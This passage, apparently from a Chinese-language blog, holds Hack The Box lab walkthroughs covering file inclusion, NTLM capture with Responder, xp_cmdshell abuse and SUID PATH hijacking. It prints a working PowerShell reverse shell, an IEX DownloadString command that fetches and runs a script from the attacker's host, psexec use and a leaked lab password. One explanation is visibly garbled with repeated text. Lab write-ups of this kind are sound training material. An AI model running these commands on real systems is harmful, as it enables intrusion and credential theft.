静态的网站基本上不会有漏洞的</p><p>点了点网站，也是很常见的公司产品官网(?不知道怎么分类，就是静态页面为主)，只有一个留言功能和一个语言切换功能有数据包请求，剩下都是由前端完成资源锚点跳转的</p><p>请求这两个功能分别是两个 html 页面的请求，但是都是跳转到首页最上方</p><p><strong>简单来说就是这里的话只有点击切换语言和发送评论功能才会有跳转，其他都是静态页面</strong></p><p><img src="../images/image-20230403161618815.png" alt="image-20230403161618815"></p><p>点击切换语言的时候，会有这个东西出现，感觉有点<strong>文件包含</strong>的意思</p><p><strong>探测漏洞—文件包含</strong></p><p>到这里有一个 <code>page</code> 参数，输入文件名，那么这个地方比较大可能存在的漏洞就是文件包含漏洞，我们在初级靶场也接触过，测试一下？</p><p>随便输入，发现报错返回了路径，使用的 <code>xampp</code>，一种比较常用的一键式集成环境搭建的网站，默认是将脚本文件放到 <code>xampp/htdocs</code> 目录下运行</p><p><img src="../images/image-20230403162422210.png" alt="image-20230403162422210"></p><p>很明显的windows环境 出现了  <code>C://</code></p><p>有什么特殊的敏感文件吗? 我们可以尝试查看 <code>hosts</code> 文件   <a href="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt">敏感文件</a></p><p><img src="../images/image-20230403163615076.png" alt="image-20230403163615076"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts</span><br></pre></td></tr></table></figure><p>直接用盘符也行</p><p><img src="../images/image-20230403163704273.png" alt="image-20230403163704273"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://unika.htb/index.php?page=C://windows/system32/drivers/etc/hosts</span><br></pre></td></tr></table></figure><p>那么如何进一步利用呢？两种思路，一是写入或包含远程后门文件，然后连接，还有是继续信息收集 <code>windows</code> 系统的账号密码信息，进行登录</p><p>我们测试一下远程文件包含，我们知道远程文件包含还需要两个条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include、allow_url_fopen 为 ON</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230403164006812.png" alt="image-20230403164006812"></p><p>发现没开，所以说明远程文件包含也用不了了</p><p>那么咱就继续进行信息收集去</p><p>我们知道这个⽹⻚容易受到⽂件包含漏洞的影响，并且在 Windows 机器上提供服务。因此，存在在我们的攻击者⼯作站上包含⽂件的可 能性。如果我们选择像 <strong>SMB</strong> 这样的协议，Windows 将尝试对我们的机器进⾏⾝份验证，并且我们可以捕获NetNTLMv2.</p><p><strong>利用 SMB 窃取 NTLM hash</strong></p><p><img src="../images/image-20230403201415201.png" alt="image-20230403201415201"></p><p><img src="../images/image-20230403201426613.png" alt="image-20230403201426613"></p><p><img src="../images/image-20230403201445815.png" alt="image-20230403201445815"></p><p><strong>SMB 协议支持 NTLM 和 LM 加密，我们通过恶意程序监听，在远程主机访问我们的 SMB 服务时，因为要进行身份验证，会发送相关信息，我们就可以获取目标主机的 hash 值，这个是为了账号密码的安全性，一般都不进行明文验证，而是使用摘要值进行比对，这样就给了我们可乘之机，不需要知道正确的账号密码，只要摘要值比对成功就可以登录</strong></p><p><strong>下载工具，使用其进行监听</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull https://github.com/lgandx/Responder </span><br></pre></td></tr></table></figure><p>确认是否支持 SMB 请求</p><p><img src="../images/image-20230403202210015.png" alt="image-20230403202210015"></p><p>监听 <code>tun0</code> ,之前有一次靶机提到过，该 IP 是和目标机器一个网络下的 10 段 IP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 Responder.py -I tun0 </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230403202438515.png" alt="image-20230403202438515"></p><p><img src="../images/image-20230403202457127.png" alt="image-20230403202457127"></p><p>我们使用 <code>curl</code> 命令来请求 <code>url</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v http://unika.htb/index.php?page=//10.129.158.196/csd </span><br></pre></td></tr></table></figure><p>这里的话要拿<code>tun0</code>的ip地址</p><p>不是拿题目的ip地址</p><p>我们发现成功接收到服务器的的 <code>NTLM</code> 值,一般是第一次请求才会发送，然后会保存到本地，下次就不会再发送了</p><p>接下来不写了   弹不成功，获得不了请求</p><p><strong>wp</strong></p><p><a href="https://blog.csdn.net/qq_40927195/article/details/124418613?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168050613316800226520463%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168050613316800226520463&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-124418613-null-null.142^v81^insert_down1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=responder%20htb&amp;spm=1018.2226.3001.4187">文章1</a></p><p><a href="blob:https://app.hackthebox.com/77561ee0-b632-4b11-820a-27746092a7a3">文章2</a>    ——&gt;   可能打不开   这是在hackthebox里面的官方文档，本地的<code>1.pdf</code>是中文翻译过来的</p><h2 id="three"><a href="#three" class="headerlink" title="three"></a>three</h2><p>考点</p><p><img src="../images/image-20230404202036676.png" alt="image-20230404202036676"></p><p>还是老样子，先ping一下</p><p><img src="../images/image-20230404202059303.png" alt="image-20230404202059303"></p><p>接下来就行端口扫描</p><p><img src="../images/image-20230404202338133.png" alt="image-20230404202338133"></p><p>扫到了两个端口</p><p>扫描发现开放 22 和 80 两个端口，22 是 <code>ssh</code> 服务，登录分为账号密码登录和<a href="https://so.csdn.net/so/search?q=公钥&amp;spm=1001.2101.3001.7020">公钥</a>登录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh username@ip</span><br><span class="line">ssh ip</span><br></pre></td></tr></table></figure><p>没有登录成功，看80端口</p><p>是一个乐队的官网，apache2.4.29 、linux 系统、php ，功能有搜索，买票，联系我们，不过都只是做个页面，<strong>没有实际的请求交互</strong></p><p>尝试目录爬取和爆破，没有什么有用的信息…</p><p>Email: <strong>mail@thetoppers.htb</strong> 看到了邮箱，然后把靶机 ip 和域名进行绑定，然后进行子域名爆破，不要问为什么这么做，学着点就行了</p><p><img src="../images/image-20230404210616587.png" alt="image-20230404210616587"></p><p>发现只有这个域名有用，但我们直接访问这个域名的时候却没有打开这个网址，应该就是没有配置hosts的原因，和上面的<code>Responder</code>是一个考点</p><p>修改后是直接能访问这个网址的</p><p>子域名爆破，这个问题，因为我们现在只能解析靶机IP和它对应的域名，子域名如何解析？即使是同一个IP的子域名，在没有修改 <code>hosts</code> 文件时也是无法访问的，工具又是如何判断爆破的子域名存在呢？</p><p>使用 <code>gobuster</code> 爆破，字典也是从别的工具里借用的，但是字典太大了，就提前结束了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -w /usr/share/wordlists/domain_dic.txt -u http://thetoppers.htb</span><br></pre></td></tr></table></figure><p> 反正就是找到了一个子域名</p><p><code>s3.thetoppers.htb</code></p><p>vhost 的主要功能是枚举某个服务上部署的所有虚拟主机，其原理是通过构造 HTTP 请求头，将字典中的域名设置到 HTTP 请求头到 HOST 字段，然后通过 IP 请求网站，如果是该域名的虚拟主机，那么请求会返回该域名下的网站内容，如果不是，则返回通过 IP 访问获得的资源而非域名下的资源</p><p>然后接下来还是修改hosts</p><p><img src="../images/image-20230404221641973.png" alt="image-20230404221641973"></p><p><img src="../images/image-20230404221721024.png" alt="image-20230404221721024"></p><p>成功了</p><p><img src="../images/image-20230404221802636.png" alt="image-20230404221802636"></p><p>使用的 <code>hypercorn</code> 这是一个 <code>ASGI</code> 服务器，启用后监听8000端口云云，不用了解太多</p><p>ASGI（异步服务器网关接口）是<a href="https://so.csdn.net/so/search?q=WSGI&amp;spm=1001.2101.3001.7020">WSGI</a>的精神继承者，旨在在具有异步功能的Python Web服务器，框架和应用程序之间提供标准接口</p><p><strong>AWS S3 拿shell</strong></p><p><code>s3</code> 👉 <code>AWS S3</code> 全名是 <code>Amazon Simple Storage Service</code> ，简便的对象存储服务，存储的数据类似键值对的形式，就是对象名：数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install awscli       // 安装工具 </span><br><span class="line">aws configure            // 配置</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230406091400477.png" alt="image-20230406091400477"></p><p>前两项配置是用户凭证，通过什么身份连接到 <code>AWS</code> 存储库，第三个是区域信息，第四个是输出格式，为什么都是 <code>temp</code> 我也不懂，可能是设置的</p><p>通过工具访问并执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aws --endpoint=http://s3.thetoppers.htb s3 ls</span><br><span class="line">aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230406091950627.png" alt="image-20230406091950627"></p><p>发现存在.htaccess，文件上传对这个很熟悉，然后我们就尝试进行文件上传看看‘</p><p><img src="../images/image-20230406092738942.png" alt="image-20230406092738942"></p><p>上传成功 成功获取 <code>webshell</code> 权限 </p><p>这里没复现成功 。。。。。</p><h2 id="Archetype"><a href="#Archetype" class="headerlink" title="Archetype"></a>Archetype</h2><p>考点</p><p><img src="../images/image-20230407142721508.png" alt="image-20230407142721508"></p><p><strong>工具介绍</strong><br><strong>smbclient</strong><br>Smbclient(samba client)是基于SMB协议的,用于存取共享目标的客户端程序。<br>参数：</p><p>网络资源 网络资源的格式为//服务器名称/资源分享名称。</p><p>密码 输入存取网络资源所需的密码。</p><p>-B 传送广播数据包时所用的IP地址。</p><p>-d&lt; 排错层级&gt; 指定记录文件所记载事件的详细程度。</p><p>-E 将信息送到标准错误输出设备。</p><p>-h 显示帮助。</p><p>-i&lt; 范围&gt; 设置NetBIOS名称范围。</p><p>-I 指定服务器的IP地址。</p><p>-l&lt; 记录文件&gt; 指定记录文件的名称。</p><p>-L 显示服务器端所分享出来的所有资源。</p><p>-M 可利用WinPopup协议，将信息送给选项中所指定的主机。</p><p>-n 指定用户端所要使用的NetBIOS名称。</p><p>-N 不用询问密码。</p><p>-O&lt; 连接槽选项&gt; 设置用户端TCP连接槽的选项。</p><p>-p 指定服务器端TCP连接端口编号。</p><p>-R&lt; 名称解析顺序&gt; 设置NetBIOS名称解析的顺序。</p><p>-s&lt; 目录&gt; 指定smb.conf所在的目录。</p><p>-t&lt; 服务器字码&gt; 设置用何种字符码来解析服务器端的文件名称。</p><p>-T 备份服务器端分享的全部文件，并打包成tar格式的文件。</p><p>-U&lt; 用户名称&gt; 指定用户名称。</p><p>-W&lt; 工作群组&gt; 指定工作群组名称。</p><p><strong>psexec</strong><br><strong>用于远程连接的工具</strong></p><p>还是先ping一下</p><p><img src="../images/image-20230407142755841.png" alt="image-20230407142755841"></p><p>接下来时扫一下端口</p><p><img src="../images/image-20230407143003810.png" alt="image-20230407143003810"></p><p><strong>这里面的135和139端口没啥用</strong></p><p><strong>对445端口进行检测</strong></p><p>smbclient -L // -L 列出所有共享用户</p><p><img src="../images/image-20230407143417585.png" alt="image-20230407143417585"></p><p>这里时空密码登录，存在backups匿名用户，可进行登录</p><p><img src="../images/image-20230407143638426.png" alt="image-20230407143638426"></p><p>匿名登录成功后，然后下载当前目录下的文件进行查看</p><p><img src="../images/image-20230407144159804.png" alt="image-20230407144159804"></p><p>可以看到这个文件是<strong>sqlserver</strong>的配置文件</p><p><img src="../images/image-20230407143745285.png" alt="image-20230407143745285"></p><p>存在数据库账号密码，然后就去查看1433端口，这个端口存在数据库</p><p><strong>检测1433端口</strong></p><p>拿到了<strong>SQLSERVER</strong>的密码和账号，我们可以尝试登陆sqlserver<br>登录sqlserver似乎有很多工具，我使用的是impacket包example文件夹中的mssqlclient.py脚本，主要是刚好最近在学习内网时用到<br>要使用impacket包要要先安装impacket工具包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo git clone https://github.com/SecureAuthCorp/impacket.git</span><br><span class="line">cd impacket/</span><br><span class="line">sudo pip3 install .</span><br><span class="line">sudo python3 setup.py install</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230407144746945.png" alt="image-20230407144746945"></p><p>成功登录数据库</p><p>查看<code>SELECT IS_SRVROLEMEMBER ( &#39;sysadmin &#39; )</code>，发现是SA权限</p><p><img src="../images/image-20230407145741555.png" alt="image-20230407145741555"></p><p><img src="../images/image-20230407145843746.png" alt="image-20230407145843746"></p><p>因此我们可以尝试使用<code>xp_cmdshell</code>来获取RCE</p><p>使用的函数为xp_cmdshell(能帮助我们拿到主机的shell)，xp_cmdshell存储过程在 SQL Server 2005以后默认关闭，需要手动开启<br>开启xp_cmdshell命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1; //开启高级选项</span><br><span class="line">RECONFIGURE; //配置生效</span><br><span class="line">exec sp_configure&#x27;xp_cmdshell&#x27;, 1; //开启xp_cmdshell</span><br><span class="line">RECONFIGURE; //配置生效</span><br></pre></td></tr></table></figure><p>可以通过exec sp_configure查看xp_cmdshell状态：<br><code>exec sp_configure</code></p><p><img src="../images/image-20230407150243802.png" alt="image-20230407150243802"></p><p>能成功执行代表配置成功了</p><p>看一下权限和ip</p><p><img src="../images/image-20230407150500391.png" alt="image-20230407150500391"></p><p>成功执行命令</p><p>然后其实我们就可以通过RCE直接读取到位于sql_svc用户桌面的flag，但是为了提高难度决定要拿到shell<br>通过RCE可以判断出目标电脑没有安装java、php、python等主流编程语言，也没有安装netcat，所以有一些反弹shell的方法无法做到</p><p><img src="../images/image-20230407150700760.png" alt="image-20230407150700760"></p><p>所以打算用<strong>powershell</strong>的脚本进行反弹shell<br>尝试使用了nishang的反弹，但是没有成功，而且在这个函数下很多命令都无法正常的执行，最后只能用简单的ps1的脚本进行反弹</p><p>折腾了半天，才把shell弹成功</p><p><img src="../images/image-20230407154522057.png" alt="image-20230407154522057"></p><p>先创建一个文件  shell.ps1</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">client = New-Object System.Net.Sockets.TCPClient(<span class="string">&quot;10.10.14.8&quot;</span>,4444);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">&quot;# &quot;</span>;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后在文件所在目录开一个python web服务器给sqlserver访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>然后监听端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure><p>最后在sql那边输入命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell &quot;powershell &quot;IEX (New-Object Net.WebClient).DownloadString(\&quot;http://10.10.16.21/shell.ps1\&quot;);&quot;&quot;</span><br></pre></td></tr></table></figure><p>然后就反弹成功，就可以求拿普通用户的flag了</p><p>此 flag 放在普通用户的桌面 （Windows下读取文件内容的命令为 type）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\sql_svc\Desktop\user.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230407154856367.png" alt="image-20230407154856367"></p><p>接下来就是提权了   就是为了拿到管理员账户的flag</p><p><strong>提权</strong></p><p>获取的当前用户是 svc 用户，用于运行数据库。管理员权限需要再获取。</p><p><strong>本靶场提权的思路是，查看 powershell 的命令执行记录获取密码。</strong></p><p>密码存储在ConsoleHost_history.txt中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span><br></pre></td></tr></table></figure><p>这里可以打开自己的windows电脑来查看，位置是一样的</p><p><img src="../images/image-20230407155250444.png" alt="image-20230407155250444"></p><p>可以看到这里使用net use 开放了一个文件共享 </p><p>该命令的作用是将主机上的backups文件夹映射到自己的T盘，后面是主机的用户名和密码。</p><p><strong>使用psexec提权，其原理是：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.通过ipc$连接，释放psexecsvc.exe到目标</span><br><span class="line"> </span><br><span class="line">2.通过服务管理SCManager远程创建psexecsvc服务，并启动服务。</span><br><span class="line"> </span><br><span class="line">3.客户端连接执行命令，服务端启动相应的程序并执行回显数据。</span><br><span class="line"> </span><br><span class="line">4.运行完后删除服务。这个在windows的日志中有详细的记录，另外psexec在少数情况下会出现服务没删除成功的bug。</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>另起终端执行</p><p>这个执行命令和ssh差不多</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-psexec administrator@10.129.32.130</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230407155626594.png" alt="image-20230407155626594"></p><p>拿到机器的管理员shell</p><p><img src="../images/image-20230407155835471.png" alt="image-20230407155835471"></p><p>拿到管理员的flag了</p><p><img src="../images/image-20230407155913391.png" alt="image-20230407155913391"></p><p>折腾了好久终于结束了。。。。。。</p><p><strong>总结</strong></p><p>通过nmap扫描发现存在 445，1433开放。smbclient 列出目标smb共享用户发现可以匿名访问，发现数据库账号密码 通过impacket 里的mssqlclient 连接上<br>发现是sa权限 获得命令执行 通过python3 搭建简易web服务器<br>让目标下载powershell脚本并执行 在目标桌面发现第一个flag 查看powershell历史记录。直接看见管理员账户密码，再用impacket里的psexec连接。</p><h2 id="Oopsie"><a href="#Oopsie" class="headerlink" title="Oopsie"></a>Oopsie</h2><p>考点</p><p><img src="../images/image-20230407160549375.png" alt="image-20230407160549375"></p><p>还是先ping一下</p><p><img src="../images/image-20230407163342232.png" alt="image-20230407163342232"></p><p>能ping成功，开始扫一下端口</p><p><img src="../images/image-20230407163658165.png" alt="image-20230407163658165"></p><p>扫到两个端口，80端口的version看起来像一个可以访问的网址</p><p>ssh先去尝试一下能不能无密码连接</p><p>发现不能后访问一下网站</p><p><img src="../images/image-20230407164019071.png" alt="image-20230407164019071"></p><p>就是一个静态页面</p><p>访问80端口后，使用小插件获取到 login 的敏感路径。（叫 findsomething ,火狐及Chrome均可在对应插件商店下载）</p><p><img src="../images/image-20230407164340474.png" alt="image-20230407164340474"></p><p>找到有个敏感登录路径</p><p><img src="../images/image-20230407164509757.png" alt="image-20230407164509757"></p><p>得到一个登录框</p><p>发现可使用 guest 账户登录。猜测进去后越权。</p><p><strong>越权</strong></p><p><img src="../images/image-20230407164712966.png" alt="image-20230407164712966"></p><p>成功登进去后</p><p><img src="../images/image-20230407164800998.png" alt="image-20230407164800998"></p><p>发现有个upload提示只有管理员才可以进行上传，我们查看下cookie，看可不可以伪造cookie进行admin登录</p><p><img src="../images/image-20230407164938115.png" alt="image-20230407164938115"></p><p>发现可以伪造cookie进行登录</p><p> 尝试更改role 为admin，再访问 upload 功能，仍无法打开。则应是通过 user 的值判断是否为admin</p><p>那 admin 的值为多少呢？ 我第一反应是爆破。后来发现思路不对。正确思路是在 account 模块下发现了</p><p><img src="../images/image-20230407165104564.png" alt="image-20230407165104564"></p><p>这样就能获取到admin的accessid了</p><p>更改下方 user 的 value 值为 34322 ，访问 upload 模块</p><p><img src="../images/image-20230407165220653.png" alt="image-20230407165220653"></p><p>成功伪造成管理员账户了，那么我们就尝试进行上传木马看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/share/webshells/php/php-reverse-shell.php</span><br></pre></td></tr></table></figure><p>将ip修改后就行了</p><p><img src="../images/image-20230407172124011.png" alt="image-20230407172124011"></p><p><img src="../images/image-20230407171925546.png" alt="image-20230407171925546"></p><p>上传成功木马文件，然后我们就去扫一下网站目录，看一下上传目录在哪，然后去访问上传目录的木马就可以反弹shell了(使用gobuster工具)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir --url http://10.129.95.204/ --wordlist /usr/share/wordlists/dirbuster/directory-list-1.0.txt -x php</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230407173155112.png" alt="image-20230407173155112"></p><p>扫到了uploads文件，估计就是这个目录存在上传文件，然后我们直接去访问看看</p><p><img src="../images/image-20230407174631148.png" alt="image-20230407174631148"></p><p>访问后成功反弹shell</p><p><img src="../images/image-20230407174723910.png" alt="image-20230407174723910"></p><p> /var/www/html 是web服务的目录，即网站的目录。这里的 cdn-cgi目录下发现了 db.php</p><p>里面有连接数据库的账户密码</p><p><img src="../images/image-20230407174809784.png" alt="image-20230407174809784"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">robert</span><br><span class="line">M3g4C0rpUs3r!</span><br></pre></td></tr></table></figure><p>在 robert 的用户目录，发现他的flag</p><p><img src="../images/image-20230407174929348.png" alt="image-20230407174929348"></p><p>拿到普通用户的flag</p><p><strong>提权</strong></p><p><a href="https://www.freebuf.com/articles/web/272617.html">简谈SUID提权</a></p><p>这里考点就是这个提权</p><p>目前拿到的是www-data用户的bash的执行权(执行 whoami 查看即可)、以及一个数据库的账户密码。因为在 home 文件夹下也发现了此账户，猜测此账户的密码与其数据库密码一致。</p><p>配合最开始的ssh端口，想到先远程登录一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh robert@10.129.95.204</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230407175212192.png" alt="image-20230407175212192"></p><p>登录成功，果然和数据库的账户密码是一样的</p><p> 如果未开放ssh端口，仍要从 bash 转换为 伪终端，可执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p> 再切换到 robert账户。不过这样不稳定，毕竟还是基于反弹shell连接的。</p><p><img src="../images/image-20230407175356208.png" alt="image-20230407175356208"></p><p>如何获得 root 权限呢？在上一个靶场中，我们通过查看 powershell 的命令记录获取到 Administrator 的权限，这次使用 SUID提权的方法。</p><p><a href="https://www.freebuf.com/articles/web/272617.html">简谈SUID提权 - FreeBuf网络安全行业门户</a></p><p>在本靶场中，如果 robert 用户执行的文件从属于 root 用户，就会用root用户的权限执行文件。</p><p>查看 robert 所在用户组、搜索可执行的文件、并查看该文件有没有 s 权限</p><p>s权限就是看是否含有suid权限，有的话就可以利用来进行提权了</p><p><strong>查找是否含有s权限</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure><p>find / -perm -4000 2&gt;/dev/null 查找具有suid权限的文件<br>2&gt;/dev/null<br>意思就是把错误输出到“黑洞”，/dev/null被称为黑洞</p><p>0——标准输入（stdin）<br>1——标准输出（stdout）<br>2——标准错误（stderr）</p><p><img src="../images/image-20230407175648124.png" alt="image-20230407175648124"></p><p>找到一个有用的了</p><p>bugtracker 这里会通过输入的数字来显示 bug<br><strong>输入一个不存在的数字 这里显示了cat 不到</strong><br>这里是用root权限去调用cat</p><p><img src="../images/image-20230407175915391.png" alt="image-20230407175915391"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">调用cat命令没有使用cat命令的绝对路径，而是使用绝对路径调用的，即在当前用户的 P A T H 环 境 变 量 指 定 的 路 径 中 搜 寻 c a t 命 令 。 可 以 创 建 一 个 名 为 c a t 的 恶 意 命 令 ， 并 修 改 当 前 用 户 的 PATH环境变量指定的路径中搜寻cat命令。 可以创建一个名为cat的恶意命令，并修改当前用户的 PATH环境变量指定的路径中搜寻cat命令。可以创建一个名为cat的恶意命令，并修改当前用户的PATH值以使bugtracker调用恶意cat命令，以获取root权限。</span><br><span class="line">切换到robert用户身份，将/tmp目录设置为P A T H 环 境 变 量 的 第 一 个 目 录 ， 切 换 到 / t m p 目 录 下 构 造 恶 意 c a t 命 令 并 赋 予 执 行 权 限 。 当 b u g t r a c k e r 再 次 调 用 c a t 命 令 时 实 际 上 调 用 的 是 / t m p 目 录 下 的 恶 意 c a t 命 令 （ s h e l l 执 行 命 令 时 按 照 PATH环境变量的第一个目录，切换到/tmp目录下构造恶意cat命令并赋予执行权限。当bugtracker再次调用cat命令时实际上调用的是/tmp目录下的恶意cat命令（shell执行命令时按照PATH环境变量的第一个目录，切换到/tmp目录下构造恶意cat命令并赋予执行权限。当bugtracker再次调用cat命令时实际上调用的是/tmp目录下的恶意cat命令（shell执行命令时按照PATH环境变量中目录的顺序搜索，搜索到即开始执行），此时robert用户临时具有了root权限，上面的id命令可以看出只是robert用户的uid变为了root，不是真正的root用户。</span><br></pre></td></tr></table></figure><p>简单来说就是因为调用cat命令的时候使用path里面搜索的，从前往后依次搜索，谁在前有就调用谁的，所以问们就可以自己定义一个路径在最前面，然后里面有cat命令，然后就会以uid(root)用户的身份执行cat</p><p>现在如果我们伪装 “/bin/bash” 为 cat，那么执行 此程序时，就会获得 root权限的shell</p><p><img src="../images/image-20230407180615180.png" alt="image-20230407180615180"></p><p>这样的话/tmp就在最前面了</p><p><img src="../images/image-20230407180936729.png" alt="image-20230407180936729"></p><p><img src="../images/image-20230407181013708.png" alt="image-20230407181013708"></p><p>这里不能使用cat的原因是cat被我们修改了</p><h2 id="vaccine"><a href="#vaccine" class="headerlink" title="vaccine"></a>vaccine</h2><p>考点</p><p><img src="../images/image-20230408152244023.png" alt="image-20230408152244023"></p><p><img src="../images/image-20230408152401774.png" alt="image-20230408152401774"></p><p>能ping通</p><p>去扫一下端口</p><p><img src="../images/image-20230408152523785.png" alt="image-20230408152523785"></p><p>扫到三个端口   一个是ftp服务器端口   一个是ssh端口  一个是80端口(看起来像是一个网站)</p><p>然后还是老思路尝试一下可不可以进行匿名登录</p><p><img src="../images/image-20230408152820068.png" alt="image-20230408152820068"></p><p>匿名登录成功</p><p>查看文件,竟然有压缩包,看这名称,大概率是源码,下载</p><p><img src="../images/image-20230408153021471.png" alt="image-20230408153021471"></p><p>然后尝试进行解压查看</p><p><img src="../images/image-20230408153128680.png" alt="image-20230408153128680"></p><p>发现需要密码才能查看源码</p><p>尝试ssh登录，不行，有密码且不是弱类型密码</p><p><img src="../images/image-20230408153321269.png" alt="image-20230408153321269"></p><p>没有头绪后查看一下这个网址，发现是这个登录框，于是尝试一下万能密码登录，弱密码  sqlmap啥的   发现不太行</p><p><img src="../images/image-20230408153614411.png" alt="image-20230408153614411"></p><p>然后尝试一下扫一下这个网站的目录看有没有啥发现   也没啥可用的东西  那么我们就尝试一下破解压缩包的密码</p><p>没别的,暴破,使用在 <code>Responder</code> 接触过的 <code>john</code> 工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip2john backup.zip &gt; hash.txt </span><br><span class="line">这个是将backup.zip 的哈希导出</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 